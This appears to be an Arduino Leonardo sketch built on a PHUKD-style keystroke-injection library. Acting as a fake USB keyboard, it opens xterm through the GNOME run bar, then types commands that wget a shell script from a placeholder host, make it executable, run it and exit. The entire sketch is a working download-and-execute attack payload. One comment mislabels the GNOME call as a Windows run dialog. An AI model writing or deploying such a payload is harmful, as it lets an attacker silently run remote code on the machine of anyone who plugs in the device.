/*
 *  phukdlib for Arduino Leonardo
 *
 *  Based on Irongeek's PHUKD Library ver 0.4
 *
 *  http://sanchezpano.info
 *
 *  Version:		0.1
 *  Design:		Ernesto Sanchez
 *  Implementation:	Ernesto Sanchez
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */

#include <phukdlib_leonardo.h>

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(10000); // Delay for 10 seconds
  CommandAtRunBarGnome("xterm"); // Execute command at Windows run dialog
  delay(1500);
  Keyboard.println("wget http://ruta/fichero.sh"); // Download file.sh
  delay(1500);
  Keyboard.println("chmod 755 fichero.sh"); // Make file.sh executable
  delay(1500);
  Keyboard.println("./fichero.sh"); // Run file.sh
  delay(1500);
  Keyboard.println("exit"); // Exit terminal
  delay(1500);
  while(1); // End
}
